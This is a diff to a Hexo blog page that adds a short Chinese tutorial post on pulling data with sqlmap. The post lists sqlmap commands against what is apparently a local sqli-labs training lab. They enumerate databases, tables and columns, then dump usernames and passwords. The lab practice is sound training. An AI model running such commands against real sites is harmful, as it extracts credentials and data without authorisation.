@@ -295,6 +295,170 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/08/30/SQLMAP提数据/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="MC">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://github.com/sunstady/hexo/blob/master/images/2017.jpg?raw=true">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sanstyle">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/08/30/SQLMAP提数据/" itemprop="url">SQLMAP提数据</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-08-30T20:48:43+08:00">
+                2017-08-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/08/30/SQLMAP提数据/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2017/08/30/SQLMAP提数据/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2017/08/30/SQLMAP提数据/" class="leancloud_visitors" data-flag-title="SQLMAP提数据">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Visitors&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>查询数据库中信息的sqlmap语句</p>
+<p>SQLMAP读取数据：</p>
+<blockquote>
+<ul>
+<li>-u 漏洞url-data “vul” POST内容<br>  –dbs 罗列所有数据库<br>  -D 指定数据库  –tables列表<br>  -D 指定数据库  -T 指定表 –columns 列所有字段<br>  -D 指定数据库  -T 指定表 -C 指定字段 –dump 获取数据<br>  –random-agent 随机ua头<br>  –level -risk 设置扫描等级</li>
+</ul>
+<ul>
+<li><p>sqlmap -u “<a href="http://10.6.67.209:8881/sqli-labs/Less-1/?id=1" target="_blank" rel="external">http://10.6.67.209:8881/sqli-labs/Less-1/?id=1</a>“ - -dbs<br>查询数据库</p>
+</li>
+<li><p>sqlmap -u “<a href="http://10.6.67.209:8881/sqli-labs/Less-1/?id=1" target="_blank" rel="external">http://10.6.67.209:8881/sqli-labs/Less-1/?id=1</a>“ - -current-db<br>查询当前使用的数据库</p>
+</li>
+<li><p>sqlmap -u “<a href="http://10.6.67.209:8881/sqli-labs/Less-1/?id=1" target="_blank" rel="external">http://10.6.67.209:8881/sqli-labs/Less-1/?id=1</a>“ -D security - -tables<br>查询所有的表</p>
+</li>
+<li><p>sqlmap -u “<a href="http://10.6.67.209:8881/sqli-labs/Less-1/?id=1" target="_blank" rel="external">http://10.6.67.209:8881/sqli-labs/Less-1/?id=1</a>“ -D security -T users - -columns<br>查询表中所有字段</p>
+</li>
+<li><p>sqlmap -u “<a href="http://10.6.67.209:8881/sqli-labs/Less-1/?id=1" target="_blank" rel="external">http://10.6.67.209:8881/sqli-labs/Less-1/?id=1</a>“ -D security -T users -C username,password - -dump<br>指定查询的列</p>
+</li>
+<li><p>两条<code>-</code>之间没有空格，style在编辑的时候，两条<code>-</code>之间没加空格，它们会连在一起，不容易看出，额，markdown用的不是很熟~</p>
+</li>
+</ul>
+</blockquote>
+
+          
+        
+      
+    </div>
+    
+    
+    
+    
+    <div>
+ 
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/08/30/Centos-Hexo-Github/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -814,7 +978,7 @@ commonweal: heartbeat
             
               <a href="/archives/">
             
-                <span class="site-state-item-count">32</span>
+                <span class="site-state-item-count">33</span>
                 <span class="site-state-item-name">Artikel</span>
               </a>
             </div>
